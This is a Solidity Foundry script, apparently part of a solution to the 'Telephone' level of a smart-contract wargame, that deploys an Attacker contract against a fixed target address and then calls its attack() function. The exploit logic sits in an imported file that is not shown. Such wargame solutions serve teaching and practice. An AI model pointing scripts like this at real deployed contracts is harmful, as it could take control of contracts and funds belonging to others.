// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Attacker} from "../src/04-Telephone/Attacker.sol";

contract Attack is Script{
    // An instance of deployed Attacker contract
    address constant private ATTACKER_ADDRESS = 0x9d77fD72139E29998b55FFF4d8387227aA244715;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker(ATTACKER_ADDRESS).attack();
        vm.stopBroadcast();
    }
}

contract DeployAttacker is Script{
    address constant private TARGET_ADDRESS = 0x5Db2e51B698520ceB8b29057a8693D104C6cB4dB;
    
    function run() public {
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(TARGET_ADDRESS);
        vm.stopBroadcast();
    }
} 